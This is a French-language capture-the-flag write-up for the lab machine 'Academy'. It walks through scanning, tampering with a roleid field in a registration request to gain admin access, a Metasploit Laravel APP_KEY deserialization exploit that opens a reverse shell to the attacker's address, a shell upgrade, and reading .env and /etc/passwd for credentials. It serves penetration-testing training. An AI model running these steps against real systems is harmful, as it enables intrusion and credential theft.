# Machine Academy

## Sommaire

* Lancement
* Connexion
* Exploitation

## Lancement

### Nmap :

Nmap : 
```bash
nmap -A 10.10.10.215 
```
Results :
```
Nmap scan report for 10.10.10.215
Host is up (0.087s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
8080/tcp open  http-proxy?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/4%OT=22%CT=1%CU=33562%PV=Y%DS=2%DC=T%G=Y%TM=601BDC5A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F
OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   94.76 ms 10.10.14.1
2   95.07 ms 10.10.10.215
```

### Associer une IP à un nom de domaine

Editer le fichier `/etc/hosts`, dans la partie IPV4 renseigner l'IP, tabuler, et le nom de domaine associer.

### Dirbuster

Lancer `dirbuster`.

Renseigner la liste voulu pour les tests : `/usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt`.

On remarque alors un chemin de fichier `admin.php` et sur register on peut se créer un compte à la volé.

### Burp

Penser à ajouter le plugin `Burp` au navigateur web.

Faire la redirection de proxy dans les paramètres du navigateur, passer en proxy manuel : avec 127.0.0.1 port 8080.

Dans `Burp` aller dans l'onglet `Proxy`, `Intercept`, le paseer en `on`, bien activer le plugin sur le navigateur et commencer à lancer les requêtes.

:warning: ne pas oublier de `Forward` pour valider les requêtes lancer sur le serveur.

## Connexion en userInvite

### Création de son Login sur academy.htb

Quand on arrive sur la page de connexion et quand on se créer son compte dans la trame `Burt` envoyer sur la dernière ligne on peut apercevoir `roleid=0`.

Changer cette valeure en `1`.

### Connexion au nouveau compte user

aller sur la page de connexion précédemment repérer :
`/admin.php`

Se connecter avec l'utilisateur créée

## Exploitation

### Lien trouvé 
`http://dev-staging-01.academy.htb/`

En aspectant la page sur laquelle on tombe, on peut voir que le serveur utiliser `Laravel` et que la ligne `APP_KEY` n'est pas masqué.

En une petite recherche permet de trouver un site qui nous montre qu'il y a une faille à exploiter.

https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/

Lancer `Metasploit` :
```
use exploit/unix/http/laravel_token_unserialize_exec
show options
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set RHOSTS academy.htb
set LHOST tun0
set LHOST 10.10.14.125
set VHOST dev-staging-01.academy.htb
exploit
```

### Upgrade le shell

Quand on arrive on a un shell sale, afin de pouvoir l'upgrade utiliser python :
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

### Recherche Mot de Passe

```
cd ../../academy
cat .env
```
A ce moent on trouve le mot de passe d'un user.

Trouvons le user :
```
cat /etc/passwd | grep /bin
ou
ls /home
```

On remarque un utilisateur que l'on a déjà croisé sur la page `admin.php`.

On se connecte 
```
su nomdelutilisateur
+
le mot de passe 
```

Upgrade à nouveau le SHELL

### Trouver le flag user

```
locate user.txt
```

## Ressources 

